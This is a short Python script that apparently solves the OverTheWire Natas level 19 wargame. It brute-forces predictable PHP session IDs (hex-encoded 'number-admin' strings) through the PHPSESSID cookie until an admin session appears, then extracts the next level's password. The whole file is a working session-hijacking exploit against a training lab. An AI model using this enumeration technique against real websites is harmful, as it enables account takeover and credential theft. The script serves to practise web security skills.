#!/usr/bin/env python3
import requests
import binascii
import argparse
import re


def make_session_id(i: int) -> str:
    return binascii.hexlify(f"{i}-admin".encode()).decode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://natas19.natas.labs.overthewire.org/index.php")
    parser.add_argument("--pass", dest="password", required=True)
    parser.add_argument("--start", type=int, default=1)
    parser.add_argument("--end", type=int, default=640)
    args = parser.parse_args()

    auth = ("natas19", args.password)

    for i in range(args.start, args.end + 1):
        sid = make_session_id(i)

        r = requests.get(
            args.url,
            auth=auth,
            cookies={"PHPSESSID": sid},
            timeout=8
        )

        if "You are an admin" in r.text:
            print("\n[+] ADMIN SESSION FOUND")
            print(f"    ID        : {i}")
            print(f"    PHPSESSID : {sid}")

            # Extract password
            match = re.search(r"password for natas20 is\s*<b>([^<]+)</b>", r.text)
            if match:
                print(f"    PASSWORD  : {match.group(1)}")
            else:
                print("\n--- RAW RESPONSE ---")
                print(r.text)

            return

        if i % 50 == 0:
            print(f"[*] Tried up to {i}")

    print("[-] Not found — increase --end if needed")


if __name__ == "__main__":
    main()
